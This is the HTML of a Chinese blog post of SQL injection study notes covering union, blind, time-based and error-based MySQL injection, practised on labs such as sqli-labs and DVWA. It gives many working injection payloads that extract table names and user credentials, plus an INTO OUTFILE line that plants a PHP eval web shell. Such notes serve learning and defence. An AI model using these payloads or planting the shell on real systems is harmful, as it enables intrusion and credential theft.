@@ -1,0 +1,1551 @@
+<!DOCTYPE html>
+<html>
+<head hexo-theme='https://volantis.js.org/#2.6.5'>
+  <meta charset="utf-8">
+  <!-- SEO相关 -->
+  
+    
+  
+  <!-- 渲染优化 -->
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <!-- 页面元数据 -->
+  
+    <title>sql注入学习 - omp&#39;s blog</title>
+  
+    <meta name="keywords" content="sql注入">
+  
+  
+    <meta name="description" content="sql注入学习笔记，感谢好朋友月夜见提供的学习资料。包含union注入、布尔盲注、时间盲注、报错注入、堆叠注入、二次注入、宽字节注入、UserAgent/Referer/Cookie注入、sqlmap的使用…">
+  
+
+  <!-- feed -->
+  
+
+  <!-- import meta -->
+  
+
+  <!-- link -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13/css/all.min.css">
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css">
+
+  
+
+  
+
+  
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10/dist/APlayer.min.css">
+  
+
+  
+
+  <!-- import link -->
+  
+
+  
+  
+    
+<link rel="stylesheet" href="/css/style.css">
+
+  
+
+  <script>
+    function setLoadingBarProgress(num) {
+      document.getElementById('loading-bar').style.width=num+"%";
+    }
+  </script>
+
+  
+  
+</head>
+
+<body>
+<script src="https://cdn.jsdelivr.net/gh/zyoushuo/Blog/hexo/js/mouse_click.js"></script>
+
+  
+  <div id="loading-bar-wrapper">
+  <div id="loading-bar"></div>
+</div>
+<header class="l_header shadow blur">
+  <div class='container'>
+  <div class='wrapper'>
+    <div class='nav-sub'>
+      <p class="title"></p>
+      <ul class='switcher nav-list-h'>
+        <li><a class="s-comment fas fa-comments fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+          <li><a class="s-toc fas fa-list fa-fw" target="_self" href='javascript:void(0)'></a></li>
+        
+      </ul>
+    </div>
+		<div class="nav-main">
+      
+        
+        <a class="title flat-box" target="_self" href='/'>
+          
+          
+          
+            omp's blog
+          
+          
+        </a>
+      
+
+			<div class='menu navigation'>
+				<ul class='nav-list-h'>
+          
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+          
+            
+            
+              <li>
+                <a class="flat-box" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+          
+				</ul>
+			</div>
+
+      <div class="m_search">
+        <form name="searchform" class="form u-search-form">
+          <i class="icon fas fa-search fa-fw"></i>
+          <input type="text" class="input u-search-input" placeholder="Search..." />
+        </form>
+      </div>
+
+			<ul class='switcher nav-list-h'>
+				
+					<li><a class="s-search fas fa-search fa-fw" target="_self" href='javascript:void(0)'></a></li>
+				
+				<li>
+          <a class="s-menu fas fa-bars fa-fw" target="_self" href='javascript:void(0)'></a>
+          <ul class="menu-phone list-v navigation white-box">
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/
+                  
+                  
+                  
+                    id="home"
+                  >
+                  <i class='fas fa-rss fa-fw'></i>博客
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/categories/
+                  
+                  
+                  
+                    id="categories"
+                  >
+                  <i class='fas fa-folder-open fa-fw'></i>分类
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/tags/
+                  
+                  
+                  
+                    id="tags"
+                  >
+                  <i class='fas fa-tags fa-fw'></i>标签
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/archives/
+                  
+                  
+                  
+                    id="archives"
+                  >
+                  <i class='fas fa-archive fa-fw'></i>归档
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/friends/
+                  
+                  
+                  
+                    id="friends"
+                  >
+                  <i class='fas fa-link fa-fw'></i>友链
+                </a>
+                
+              </li>
+            
+          
+            
+              
+            
+              <li>
+                <a class="flat-box" href=/about/
+                  
+                  
+                  
+                    id="about"
+                  >
+                  <i class='fas fa-info-circle fa-fw'></i>关于
+                </a>
+                
+              </li>
+            
+          
+            
+          </ul>
+        </li>
+			</ul>
+		</div>
+	</div>
+  </div>
+</header>
+
+<script>setLoadingBarProgress(40);</script>
+
+
+
+  <div class="l_body nocover">
+    <div class='body-wrapper'>
+      
+
+<div class='l_main'>
+  
+
+  
+    <article id="post" class="post white-box reveal shadow article-type-post" itemscope itemprop="blogPost">
+      
+
+
+  <section class='meta'>
+    
+      
+      
+      <div class="meta" id="header-meta">
+        
+          
+  <h1 class="title">
+    <a href="/2020/11/30/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
+      sql注入学习
+    </a>
+  </h1>
+
+
+        
+        <div class='new-meta-box'>
+          
+            
+          
+            
+              
+<div class='new-meta-item author'>
+  <a href="" rel="nofollow">
+    <img src="https://ae01.alicdn.com/kf/H68ac7f1be81b4260813ba8136aef8160J.jpg">
+    <p>omp</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+  
+  <div class='new-meta-item category'>
+    <a href='/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/' rel="nofollow">
+      <i class="fas fa-folder-open fa-fw" aria-hidden="true"></i>
+      <p>学习笔记</p>
+    </a>
+  </div>
+
+
+            
+          
+            
+              <div class="new-meta-item date">
+  <a class='notlink'>
+    <i class="fas fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：Nov 30, 2020</p>
+  </a>
+</div>
+
+            
+          
+            
+              
+
+            
+          
+            
+              
+  <div class="new-meta-item browse valine">
+    <a class='notlink'>
+      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+      <span id="/2020/11/30/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="leancloud_visitors" data-flag-title="sql注入学习">
+      <p>
+        <span class="leancloud-visitors-count"></span>
+      </p>
+      </span>
+    </a>
+  </div>
+
+
+            
+          
+            
+          
+            
+          
+            
+              
+
+            
+          
+        </div>
+        
+          <hr>
+        
+      </div>
+    
+  </section>
+
+
+      <section class="article typo">
+        <div class="article-entry" itemprop="articleBody">
+          
+          <p>sql注入学习笔记，感谢好朋友月夜见提供的学习资料。包含union注入、布尔盲注、时间盲注、报错注入、堆叠注入、二次注入、宽字节注入、UserAgent/Referer/Cookie注入、sqlmap的使用…</p>
+<a id="more"></a>
+<h2 id="14-SQL注入原理"><a href="#14-SQL注入原理" class="headerlink" title="14 SQL注入原理"></a>14 SQL注入原理</h2><h3 id="OWASP-top10"><a href="#OWASP-top10" class="headerlink" title="OWASP top10"></a>OWASP top10</h3><h3 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h3><ul>
+<li><p>sql：结构化查询语言</p>
+</li>
+<li><p>应用系统使用sql管理数据库，采用<strong>拼接</strong> 的方式形成一条完整的数据库语言</p>
+</li>
+<li><p>把sql命令插入到<strong>web表单</strong>或<strong>输入域名页面请求</strong>的查询字符串</p>
+</li>
+</ul>
+<h3 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h3><h4 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h4><h5 id="什么是数据库"><a href="#什么是数据库" class="headerlink" title="什么是数据库"></a>什么是数据库</h5><h6 id="关系型数据库管理系统（RDBMS）"><a href="#关系型数据库管理系统（RDBMS）" class="headerlink" title="关系型数据库管理系统（RDBMS）"></a>关系型数据库管理系统（RDBMS）</h6><p>关系型数据库，是建立在关系模型基础上的数据库，借助于集合代数等数学概念和方法来处理数据库中的数据。</p>
+<p>RDBMS 的特点：</p>
+<ul>
+<li>1.数据以表格的形式出现</li>
+<li>2.每行为各种记录名称</li>
+<li>3.每列为记录名称所对应的数据域</li>
+<li>4.许多的行和列组成一张表单</li>
+<li>5.若干的表单组成database</li>
+</ul>
+<p><img src="/2020/11/30/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200324111143839.png" alt="image-20200324111143839"></p>
+<h5 id="数据库基础-1"><a href="#数据库基础-1" class="headerlink" title="数据库基础"></a>数据库基础</h5><h6 id="常用数据库查询语句"><a href="#常用数据库查询语句" class="headerlink" title="常用数据库查询语句"></a>常用数据库查询语句</h6><ul>
+<li>create datebase   创建数据库<strong>数据库名字不能使用全数字</strong></li>
+<li>drop database </li>
+<li>show databases</li>
+<li>select databses() 当前的数据库名</li>
+</ul>
+<p>使用一个数据库 use 数据库名；</p>
+<p><a href="https://www.runoob.com/mysql" target="_blank" rel="noopener">https://www.runoob.com/mysql</a></p>
+<h6 id="常用数据库内置变量"><a href="#常用数据库内置变量" class="headerlink" title="常用数据库内置变量"></a>常用数据库内置变量</h6><ul>
+<li><p>version() 查询数据库版本</p>
+<p>@@version 效果等同</p>
+</li>
+<li><p>user() 数据库运行的用户</p>
+</li>
+<li><p>datebase() 数据库名</p>
+</li>
+</ul>
+<p>相当于在命令行下执行 select version()</p>
+<h2 id="15、16-mysql注入常见函数"><a href="#15、16-mysql注入常见函数" class="headerlink" title="15、16   mysql注入常见函数"></a>15、16   mysql注入常见函数</h2><p>1.字符串链接函数</p>
+<ul>
+<li>concat 链接多个字符串 </li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select concat(name,&#39;|&#39;,email,&#39;|&#39;,passwprd) from users;</span><br><span class="line">#若字符串查询内容中有一个为空，则整体为空</span><br></pre></td></tr></table></figure>
+<ul>
+<li>concat_ws</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#39;|&#39;,name.email,password) from users;</span><br><span class="line">#不会整体为空，第一个参数为分隔符，如果第一个参数为空，则整体为空</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>group_concat</p>
+<p>把字段里的内容一起显示，限制：查询出来的结果的长度默认是1024</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(username) from users;</span><br></pre></td></tr></table></figure>
+<p>​            可以进行联合使用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(concat_ws(&#39;|&#39;,username,id)) from users;</span><br></pre></td></tr></table></figure>
+<p>2.字符串截取函数</p>
+<p>所有函数操作数从1开始而不是从0开始，除limit外</p>
+<ul>
+<li>substring</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select substring((select username from users limit 0,1)，1，2)</span><br><span class="line">#substring第一个参数 查询的结果字符串，第二个参数 从什么地方开始截取，第三个参数 长度是多少</span><br><span class="line">#limit 如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目</span><br></pre></td></tr></table></figure>
+<p>substr也可以代替使用</p>
+<ul>
+<li>mid</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select mid(&#39;test123&#39;,2,3)</span><br><span class="line">&gt;est</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>left</p>
+<p>从左开始截取长度为3，right函数相反</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select left(&#39;test123&#39;,3)</span><br><span class="line">&gt;tes</span><br><span class="line">select right(&#39;test123&#39;,3)</span><br><span class="line">&gt;123</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>locate</p>
+<p>返回第一个参数字符串在第二个参数中第一次出现的位置</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select locate(‘123test123&#39;,&#39;as123test123&#39;)</span><br><span class="line">&gt;3</span><br></pre></td></tr></table></figure>
+<p>3.返回指定的ASCII字符对应的数值</p>
+<ul>
+<li><p>ascii </p>
+<p>只有一个参数，需要转换的</p>
+<p>ord与ascii用法相同</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select ascii(&#39;a&#39;);</span><br><span class="line">&gt;97</span><br><span class="line">select ascii(substring((select username from users limit 0,1),2,1));</span><br></pre></td></tr></table></figure>
+<p>4.返回指定数字对应的ascii字符</p>
+<ul>
+<li>char</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select char(97);</span><br><span class="line">&gt;a</span><br></pre></td></tr></table></figure>
+<p>5.字符串替换</p>
+<ul>
+<li><p>replace</p>
+<p>把username字段里的zangsan sds替换为了hh</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select replace((select  username from users limit 0,1),&#39;zangsan sds&#39;,&#39;hh&#39;)</span><br></pre></td></tr></table></figure>
+<p>6.计算长度</p>
+<ul>
+<li>length</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select length(&#39;hahshdk&#39;);</span><br><span class="line">&gt;7</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>count</p>
+<p>记录某个表下有多少记录</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from users;</span><br></pre></td></tr></table></figure>
+<p>7.时间盲注会用到的函数</p>
+<p>sleep、if</p>
+<ul>
+<li><p>sleep</p>
+<p>使输出结果延迟了10s</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users union select 1,2,sleep(10);</span><br></pre></td></tr></table></figure>
+<p>8.读写文件函数</p>
+<p>写文件</p>
+<p>into outfile </p>
+<p>把一句话木马写入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php@eval($_POST[&#39;mm&#39;?])&gt;&quot; into outfile &quot;d:&#x2F;shell.php&quot;</span><br></pre></td></tr></table></figure>
+<p>一般路径是网站的根路径</p>
+<p>into dumpfile(读取二进制文件)</p>
+<p>读文件</p>
+<p>load_file()</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#39;d:&#x2F;shell.php&#39;)</span><br></pre></td></tr></table></figure>
+<p>9.注释方法</p>
+<ul>
+<li>#</li>
+<li>/— -</li>
+<li>— +</li>
+<li>/**/</li>
+<li>/<em> ! </em> /</li>
+<li>/<em>!50000 </em>/ mysql5通用，带版本内联注释</li>
+</ul>
+<h2 id="17-18information-schema相关"><a href="#17-18information-schema相关" class="headerlink" title="17 18information_schema相关"></a>17 18information_schema相关</h2><p>information_schema(mysql 5.0以上的版本才存在)</p>
+<p>在MySQL中，把information_schema看作是一个数据库，确切地说是信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</p>
+<p><a href="https://www.cnblogs.com/shengdimaya/p/6920677.html" target="_blank" rel="noopener">https://www.cnblogs.com/shengdimaya/p/6920677.html</a></p>
+<p>SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases结果取于此表</p>
+<p>TABLES表：提供了关于数据库中所有的表的信息。详细描述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname(数据库名)的结果取之此表。</p>
+<p>COLUMNS表：所有数据库所包含的所有表的列名信息以及每个列的信息。是show columns from schemaname.tablename 的结果取之此表。</p>
+<h3 id="information-schema在mysql注入中的运用"><a href="#information-schema在mysql注入中的运用" class="headerlink" title="information_schema在mysql注入中的运用"></a>information_schema在mysql注入中的运用</h3><p>先查询出mysql版本</p>
+<h2 id="19-、20-union注入"><a href="#19-、20-union注入" class="headerlink" title="19 、20 union注入"></a>19 、20 union注入</h2><p>实验环境搭建：dvwa sqli-labs</p>
+<h3 id="基于union的注入"><a href="#基于union的注入" class="headerlink" title="基于union的注入"></a>基于union的注入</h3><p>?后表示通过get方式传递的参数</p>
+<p>order by判断当前查询表里的字段</p>
+<p>?id=1 union select 1,2,3</p>
+<p>?id=0(查询不到，执行后面的查询) union select 1,2,3</p>
+<p>  1,2,3为三个字段用于占位，可以更改为想要查询内容你的对应函数</p>
+<h6 id="获取对应表"><a href="#获取对应表" class="headerlink" title="获取对应表"></a>获取对应表</h6><p>?id=0 union select 1,database(),table_name from information_schema.tables where table_schema=’test’</p>
+<p>>test:users</p>
+<h6 id="查询列"><a href="#查询列" class="headerlink" title="查询列"></a>查询列</h6><p>?id=0 union select 1,database(),column_name from information_schema.columns where table_schema=’test’ and table_name=’users’</p>
+<p>>test:id</p>
+<p>但列名不止id一个字段</p>
+<p>?id=0 union select 1,database(),group_concat(column_name) from information_schema.columns where table_schema=’test’ and table_name=’users’</p>
+<p>查询出所有列名</p>
+<p>如果只能看一个就可通过limit进行查阅</p>
+<p>?id=0 union select 1,database(),column_name from information_schema.columns where table_schema=’test’ and table_name=’users’ limit 1,1</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tableName <span class="keyword">limit</span> i,n</span><br><span class="line"><span class="comment"># tableName：表名</span></span><br><span class="line"><span class="comment"># i：为查询结果的索引值(默认从0开始)，当i=0时可省略i</span></span><br><span class="line"><span class="comment"># n：为查询结果返回的数量</span></span><br><span class="line"><span class="comment"># i与n之间使用英文逗号","隔开</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">limit</span> n 等同于 <span class="keyword">limit</span> <span class="number">0</span>,n</span><br></pre></td></tr></table></figure>
+<h6 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h6><p>?id=0 union select 1,database(),username from users limit 0,1 //或使用group_concat()</p>
+<h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><p>判断是否存在sql注入</p>
+<ul>
+<li><p>通过单引号进行查找 </p>
+<p>？id=114’</p>
+<p>单引号破坏了原来sql语句的语法，并报错。确定114’被采用拼接方式带入了数据库执行</p>
+<p>—+注释掉后面的单引号 +在url中是空格的意思</p>
+</li>
+<li><p>当加减法对页面没有影响时，说明不是数字型的注入</p>
+</li>
+<li><p>通过sleep判断sql注入是否存在</p>
+<p>?id=114 and sleep(10)</p>
+<p>通过f12查询所需时间发现没有影响，说明可能把114后内容舍弃了</p>
+</li>
+</ul>
+<p>确定注入字段数</p>
+<ul>
+<li>通过order by </li>
+<li>?id=114’order by +字段数</li>
+</ul>
+<p>联合查询</p>
+<ul>
+<li><p>通过编码方式绕过关键字过滤</p>
+</li>
+<li><p>查询数据库版本 5.0以下不能使用information_schema</p>
+</li>
+<li><p>查找出当前数据库</p>
+</li>
+<li><p>查找出所有表</p>
+<p>?id=114’ union select 1,2,table_name,4,5,6 from information_schema.tables where table_schema=’interali_project’—+</p>
+<p>可以通过group_concat将查询结果连接在一起</p>
+</li>
+<li><p>获取相关表的字段名</p>
+<p>?id=114’ union select 1,2,column_name,4,5,6 from information_schema columns where table_schema=’interali_project’ and table_name=’usertable’—+</p>
+</li>
+<li><p>获取字段下的数据</p>
+<p>?id=114’ union select 1,2,username,4,5,6 from usertable—+</p>
+</li>
+</ul>
+<h2 id="21-、22-布尔盲注"><a href="#21-、22-布尔盲注" class="headerlink" title="21 、22 布尔盲注"></a>21 、22 布尔盲注</h2><h3 id="手工注入过程"><a href="#手工注入过程" class="headerlink" title="手工注入过程"></a>手工注入过程</h3><p>1.获取数据库名字长度</p>
+<p>?id=1’ and (length(datebase()))—+</p>
+<p>?id=1’ and (length(database()))&gt;5—+</p>
+<p>2.获取数据库名字</p>
+<p>?id=1’ and ascii(substr(database(),1,1))&gt;100—+</p>
+<p>//排序除limit外，都从1开始</p>
+<p>使用burp的intruder模块遍历</p>
+<p>3.获取表的数量</p>
+<p>?id=1’ and (select count(*) from information_schema.tables where table_schema=database())&gt;5—+</p>
+<p>4.获取表名的长度</p>
+<p>?id=1’ and (select length(table_name) from information_schema.tables where table_schema=database() limit 0,1//只获取第一个表名)&gt;5—+</p>
+<p>通过limit获取每张表表名的长度</p>
+<p>5.获取表的名字</p>
+<p>?id=1’ and (select ascii(substr(table_name,1,1) from information_schema.tables where table_shcema=database() limit 0,1)&gt;100—+ </p>
+<p>6.获取列名的数量</p>
+<p>?id=1’ and (select count(column_name) from information_schema.columns  where table_schema=databse() and table_name=’emails’)&gt;5—+</p>
+<p>7.获取列名的长度</p>
+<p>?id =1’ and (select length(column_name) from information_schema.columns where table_schema=database() and table_name=’emails’ limit 0,1)&gt;2—+</p>
+<p>8.获取列的名字</p>
+<p>?id=1’ and (select ascii(substr(column_name,1,1)) from information_schema.columns where table_schema=database() and table_name=’emails’ limit 0,1)&gt;100—+</p>
+<p>9.获取表中的数据</p>
+<p>获取数据</p>
+<p>?id=1’ and ascii(substr((select id from emails limit 0,1),1,1))=49—+</p>
+<p>?id=1’ and ascii(substr((select id from emails limit 1,1),1,1))=50—+</p>
+<p>…….</p>
+<h3 id="使用burpsuite"><a href="#使用burpsuite" class="headerlink" title="使用burpsuite"></a>使用burpsuite</h3><p>进行抓包-&gt; Intruder-&gt;Positions(目标)-&gt;Sniper(狙击模式)-&gt;clear 去掉默认加的变量符-&gt;把需要猜测的ascii值加上变量符 $114$ -&gt;设置Payload payload set=1 payload type=Numbers -&gt;选择sequential(顺序)或random,from 0 to 127,step=1-&gt;start</p>
+<p>最好使用等于号，而不是大于号小于号，使结果一目了然，只有一个</p>
+<h2 id="23-时间盲注"><a href="#23-时间盲注" class="headerlink" title="23  时间盲注"></a>23  时间盲注</h2><p>通过时间变化判断sql语句是否被成功地执行</p>
+<h3 id="判断id数据类型成功执行sql语句"><a href="#判断id数据类型成功执行sql语句" class="headerlink" title="判断id数据类型成功执行sql语句"></a>判断id数据类型成功执行sql语句</h3><p>?id=1’ and sleep(10)—+</p>
+<p>加载10s以上  查看方法:f12-&gt;Network 看到整个请求完成的时间</p>
+<p>假设id是数字型 ?id=1 and if(1=1,sleep(5),1)//若1=1，sleep(5);else,返回1</p>
+<p>没有延时，假设是字符型</p>
+<p>?id=1’ and if(1=1,sleep(5),1)—+//若1=1，sleep(5);else</p>
+<p>有延时，说明id是字符型</p>
+<h3 id="进行盲注"><a href="#进行盲注" class="headerlink" title="进行盲注"></a>进行盲注</h3><p>示例:?id=1’ and if(&gt;123,sleep(5),1)—+</p>
+<p>获取数据库版本号</p>
+<p>?id=1’ and if(ascii(mid((select version()),1,1//字符串截取函数,类似于substr))&gt;50),sleep(5),1)—+ </p>
+<p>?id=1’ and if(ascii(mid((select table_name from information_schema.tables),1,1))&gt;50),sleep(5),1)—+ </p>
+<h2 id="24-floor报错注入原理"><a href="#24-floor报错注入原理" class="headerlink" title="24 floor报错注入原理"></a>24 floor报错注入原理</h2><p>十种MySQL报错注入</p>
+<h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>1.rand()产生伪随机数的数列 随机产生0-1中间的数</p>
+<p>rand(seed)</p>
+<p>2.count(*)</p>
+<p>select count(*) from floortest 查询表下有多少列</p>
+<p>3.group by 分组</p>
+<p>select * from floortest group by name</p>
+<p>以name列为基准分组 name下重复的归到一组</p>
+<p>select count(*),name from floortest group by name</p>
+<p>4.floor()</p>
+<p>向下取整  floor(2.99) -&gt; 2</p>
+<p> rand(0) seed=0 整条语句结果是固定的随机数</p>
+<p>select floor(rand(0)*2);  -&gt; 0</p>
+<p>select floor(rand(0)*2) from floortest; -&gt;产生0和1两种结果</p>
+<p>5.count(*)+group by创建虚拟表</p>
+<p>会根据数据的需要，临时建立一个虚拟表，来进行计数</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>key</th>
+<th>count（*）</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td></td>
+<td></td>
+</tr>
+<tr>
+<td>1</td>
+<td>1</td>
+</tr>
+<tr>
+<td>0</td>
+<td>1</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>查询时 先查询表中key有无此数据，若没有，插入这个数据；若有，+1</p>
+<p>第一个数为0  查询虚拟表中没有 插入floor(rand(0)*2) 语句再执行一次 变为1 所以插入key=1</p>
+<p>第二个数为1 查询表中有1 count=1+1</p>
+<p>第三个数为0 查询虚拟表中没有 插入floor(rand(0)*2) 又变为1 </p>
+<p>此时报错 Duplicate entry’1’ for key’group_key’</p>
+<p> //键’group_key’的重复条目’1’</p>
+<p>select count(<em>),concat(user(),floor(rand(0)\</em> 2)) from floortest group by concat(user(),floor(rand(0)*2))</p>
+<p>select count(<em>),concat(user(),floor(rand(0)\</em>2))x from floortest group by x  //给concat(user(),floor(rand(0)*2))设置别名x，直接用x代表</p>
+<p>若不知道表名可以使用</p>
+<p>select count(<em>),concat(user(),floor(rand(0)\</em>2))x from information_schema.tables group by x</p>
+<p>由于上面的语句查询出来的结果是一张表，必须将其变为具体数值(true false)才能与and进行操作，只能是布尔值，需要在嵌套一次查询</p>
+<p>select <em> from floortest where id=1 and **(select 1 from(select count(</em>),concat(user(),floor(rand(0)*2))) x from information_schema.tables group by x)a);**</p>
+<p>需要给(select count(<em>),concat(user(),floor(rand(0)\</em>2))) x from information_schema.tables group by x)表添加一个别名a</p>
+<h2 id="25-floor报错注入利用演示"><a href="#25-floor报错注入利用演示" class="headerlink" title="25 floor报错注入利用演示"></a>25 floor报错注入利用演示</h2><p>查询数据库名</p>
+<p>?id=1’) and(select 1 from(select count(<em>),concat(database(),floor(rand(0)</em>2))a from information_schema.tables group by a)x)—+</p>
+<p>>‘security1’</p>
+<p>查询表名</p>
+<p>?id=1’) and (select 1 from(select count(<em>),concat(==(select table_name from information_schema.tables where table_schema=’security’ limit 0,1)==，floor(rand(0)\</em>2))a from information_schema.tables group by a)x)—+</p>
+<p>查询列名</p>
+<p>?id=1’) and (select 1 from(select count(<em>),concat(==(select column_name from information_shcema.columns where table_schema=’security’ and table_name=’users’ limit 0,1)==，floor(rand(0)\</em>2))a from information_schema.tables group by a)x)—+</p>
+<p>查询到两列 username和password</p>
+<p>查询数据</p>
+<p>?id=1’) and (select 1 from(select count(<em>),concat(==(select username from users  limit 0,1)==，floor(rand(0)\</em>2))a from information_schema.tables group by a)x)—+</p>
+<p>?id=1’) and (select 1 from(select count(<em>),concat(==(select password from users  limit 0,1)==，floor(rand(0)\</em>2))a from information_schema.tables group by a)x)—+</p>
+<h2 id="26-extractvalue-和updatexml-报错注入"><a href="#26-extractvalue-和updatexml-报错注入" class="headerlink" title="26 extractvalue()和updatexml()报错注入"></a>26 extractvalue()和updatexml()报错注入</h2><h3 id="报错原理"><a href="#报错原理" class="headerlink" title="报错原理"></a>报错原理</h3><p>extractvalue()有两个参数</p>
+<p>updatexml()有三个参数</p>
+<p>两个函数都是在第二个位置的参数上进行修改注入</p>
+<p>这两个函数都是用来处理xml文档的</p>
+<p>报错都是xml语法错误</p>
+<p>只要两个函数的第二个参数不符合xml语法，就会发生报错</p>
+<p>?id=1’ and (updatexml(1,concat(0x7e,(select database()),0x7e),1))—+</p>
